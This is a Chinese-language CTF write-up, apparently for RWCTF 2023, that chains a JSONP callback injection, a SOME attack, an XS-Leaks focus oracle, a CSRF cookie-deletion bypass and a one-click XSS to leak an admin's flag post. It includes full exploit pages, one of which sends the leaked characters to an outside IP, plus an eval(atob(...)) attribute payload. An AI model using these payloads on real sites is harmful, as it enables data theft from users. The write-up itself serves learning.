---
archive: CTF
tags: 
  - xsLeaks
  - SOMEattack
Date: 2023/1/10
---

这题的步骤挺复杂的hh

题目环境的 flag 是在 admin 账号的唯一一篇 post 中，但限制了 admin 账号新建 post 和 todo 功能，并且设置了 session 是 httponly，并不能使用 js 直接脚本获取。由于对于 `/post/:id` 没有任何鉴权和 csrf 防御，唯一的想法便是获取 flag 那篇 post 的 uuid。

## SOME Attack

在 `post.ejs` 下发现了 jsonp 的奇怪写法：
```js
const request = new XMLHttpRequest();
try {
  request.open('GET', POST_SERVER + `/api/post/` + encodeURIComponent(id), false);
  request.send(null);
}
catch (err) { // POST_SERVER is on another origin, so let's use JSONP
  let script = document.createElement("script");
  script.src = `${POST_SERVER}/api/post/${id}?callback=load_post`;
  document.head.appendChild(script);
  return;
}
```

如果进入 catch 块便可以直接控制 callback。

查询 [request.open](https://xhr.spec.whatwg.org/#the-open()-method)：

> Throws a “SyntaxError” DOMException if either method is not a valid method or **url** cannot be parsed.

通过 fuzz 可以发现 `\x00` 可以触发 `request.open` 的报错从而进入 catch 块中，进而可以控制 `callback`，所以构造：

```
/post/?id={valid_id}?callback=our_function%23%00
```

这里需要了解 [SOME](https://www.someattack.com/Playground/About) 攻击，借用白神的话简单理解：

> attack大概是指同源网站间可以互相操作，比如 example.com/secret.html 有敏感信息，但是你获取不到，攻击者可以通过存在XSS的页面 example.com/xss.html 通过SOME attack 获取到 secret.html 的内容。

而对 callback 的控制便使我们能完成 SOME 攻击。大概思路就是打开一个 `secret` 页面，然后 open 一个同源网址带上 `callback` 函数，而 `opener` 便是 `secret` 的 window 对象。

对于 express 的 jsonp callback，它会删除一些特殊字符比如 `()`，但 `[]` 以及dot 还能使用。

```js
/**/ typeof foo.bar[neko] === 'function' && foo.bar[neko]({"success":false,"error":"No post found with that id"});
```

## XsLeaks

通过 SOME attack 可以获取到 admin home 上的 uuid 内容，但还需要考虑的是如何外带。

第一种方法是 xsleaks。

首先打开 admin home 页面，然后打开 uuid 字符数 (17) 个同源 iframe 的 iframes 页面，每个 iframe 的 name 对应着一个字符。

在 attack 页面逐位获取 uuid 字符，然后由于同源的可操作性，调用 callback 操作 iframes 页面上的 iframe，相应字符的 iframe 打上 `focus` 标记，其中有一个 check 一直循环检测页面的 focus 情况，一旦有 active 的 iframe 便将该 name 存进 result，最后在这个页面发出跨域请求。

感觉有点麻烦，实际确实麻烦。。。因为除了 xsleaks 的时间需要合理控制，题目的 bot 只有 15 s 的时间限制，这么短的时间对于一次 xsleaks 来说显然不够，只能分段获取，然后拼成整个 uuid。

`start.html` :
```html
<script>
    iframes = open(`/iframes.html`);
    location.replace("http://localhost:12345/");
</script>
```

`iframes.html` :
```html
<body>
    <a id=focusme href=#>sth</a>
    <script>
        const sleep = d => new Promise(r => setTimeout(r, d));
        alphabet = "0123456789abcdef-"

        //create iframes
        for (var i = 0; i < alphabet.length; i++) {
            iframe = document.createElement("iframe");
            iframe.name = alphabet[i];
            iframe.src = "http://localhost:12345/";
            document.body.appendChild(iframe);
        }

        //array for found characters
        hovered = []

        const main = async () => {
            // every 0.075 secs check for iframes' onfucus event
            setInterval(() => {
                p = document.activeElement.name
                if (p) {
                    // if there's focus on an iframe -- add its character to hovered and change the focus
                    hovered.push(p);
                    document.getElementById("focusme").focus();
                }
            }, 75)

            await sleep(2000);
            one = open(`/one.html`);
            await sleep(2000 + 150);

            // every 500 secs send found characters to our server endpoint /ret/:characters
            setInterval(() => {
                res = hovered.join("");
                console.log(res);
                fetch("http://8.142.104.78:9002/ret/" + res)
            }, 500);
        }

        main();
    </script>
</body>
```

`one.html` :
```html
<script>
    attack = open(`/attack.html`);
</script>
```

`attack.html` :
```html
<script>
    const sleep = d => new Promise(r => setTimeout(r, d));
    const main = async () => {
        await sleep(1000);
        const start = 0;
        for (var i = start; i <= start+36+1; i++) {
            // I'm explainig this payload below
            PAYLOAD = `opener[opener.opener.document.body.firstElementChild.nextElementSibling.firstElementChild.firstElementChild.firstElementChild.firstElementChild.nextElementSibling.nextElementSibling.nextElementSibling.firstElementChild.firstElementChild.firstElementChild.text[${i}]].focus`;
            // change one.html page's location to the vulnerable page that executes callback
            opener.location.replace(`http://localhost:12345/post/?id=fake?callback=${PAYLOAD}%23%00`);
            // check the next character every 1.5 secs so that the page have 1.5 sec to load.
            await sleep(1500);
        }
    }

    main();
</script>
```

open顺序：
start -> iframes -> one -> attack

## Delete Cookie And XSS

第二种方法算是学到了。

在 todo 中有一个 url 处理：
```js
let isURL = false;
try {
	new URL(text); // errors if not valid URL
	isURL = !text.toLowerCase().trim().startsWith("javascript:"); // no
} catch {}
```

其对应的渲染如下：
```js
  <%_ user.todos.forEach(todo => { _%>
	<%_ if (todo.isURL) { _%>
	  <li class="has-text-left"><a target="_blank" href=<%= todo.text %>><%= todo.text %></a></li>
	<%_ } else { _%>
	<li class="has-text-left"><%= todo.text %></li>
	<%_ } _%>
  <%_ }); _%>
```

发现 `href` 渲染并没有加引号，所以直接可以对 a 元素添加 onclick 属性造成 1click XSS，脚本内容任意，可以外带数据。

```
http://localhost:12345?<space>onclick=eval(atob(`base64code`))
```

对于 csrf 的验证存在漏洞，若直接删除 cookie 中的 `_csrf` 键值对，由于服务端 cookie 中记录的 hasCSRF 一直为 True， 不会被更改，能直接绕开 csrf 限制访问所有 api。

而 callback 的参数对象是：
```json
{"success":true,"name":"foo","body":"bar"}
```

而 `cookieStore.delete` 所能接收的参数中 `name` 正代表 cookie 的键名。所以构造一个 name 为 `_csrf` 的 note 再调用 callback 便能删除 csrf。

所以这种方法的步骤是：
1. 准备工作先注册一个账号；创建一个 `name` 为 `_csrf` 的 post，记录下 uuid；创建一个内容为 `http://localhost:12345?<space>onclick=eval(atob(`base64code`))<space>` 的 todo。
2. 打开 admin home 页面并保留。
3. `callback` 调用 `cookieStore.delete` 删除 `csrf`。
4. 调用 `logout` 清除 `session`。
5. 同 3 删除 `csrf`。
6. `login.html` 表单登录自己的账号。
7. 通过 `callback` 的 `document.links[x].click` 点击 todo 链接触发 1click XSS，带出 admin home 的内容。

`start.html` :
```html
<script>
    const sleep = d => new Promise(r => setTimeout(r, d));
    (async () => {
        open(`/attack.html`);
        location.replace("http://localhost:12345");
    })()
</script>
```

`attack.html` :
```html
<script>
    const sleep = d => new Promise(r => setTimeout(r, d));

    async function delete_csrf() {
        PAYLOAD = `cookieStore.delete`;
        // uuid's name is `_csrf`
        page = open(`http://localhost:12345/post/?id=77a90981-3856-40ba-8c7a-fdbb0bd52eeb?callback=${PAYLOAD}%23%00`);
        await sleep(1000);
        page.close();
    }

    (async () => {
        // delete cookie
        await delete_csrf();

        // logout
        page = open("http://localhost:12345/api/logout");
        await sleep(1000);
        page.close();

        // delete cookie
        await delete_csrf();

        // login
        page = open(`/login.html`);
        await sleep(1000);
        page.close();

        // attack with clicking the todo link
        PAYLOAD = `opener.document.links[5].click`;
        page = open(`http://localhost:12345/post/?id=id?callback=${PAYLOAD}%23%00`);
        location.replace("http://localhost:12345");
    })()
</script>
```

`login.html` :
```html
<body>
    <form action="http://localhost:12345/api/login" method="POST">
        <input class="input" type="text" placeholder="Username" name="user"
        value="SSSSilentE"/>
        <input class="input" type="password" placeholder="Password" name="pass"
        value="SSSSilentE"/>
        <input type="submit" value="Login"/>
    </form>
    <script>
        document.forms[0].submit();
    </script>
</body>
```

两种方法的回显：

![](https://image.silente.top/img/p3.png)

## 总结

题目主要的漏洞点在于 jsonp 的 callback 可控，从而能够 SOME attack。当然还有一个关于 csrf 的写法问题导致了对于 csrf 的绕过，一个对于模板渲染的处理不当导致了元素属性的脚本注入。

这题确实从中学了挺多东西，xsleaks 的构造也挺有趣的。

## Ref
- https://h4cking2thegate.github.io/2023/01/10/RWCTF2023-the-cult-of-8bit/
- Sndav
- https://sh1yo.art/ctf/thecultof8bit/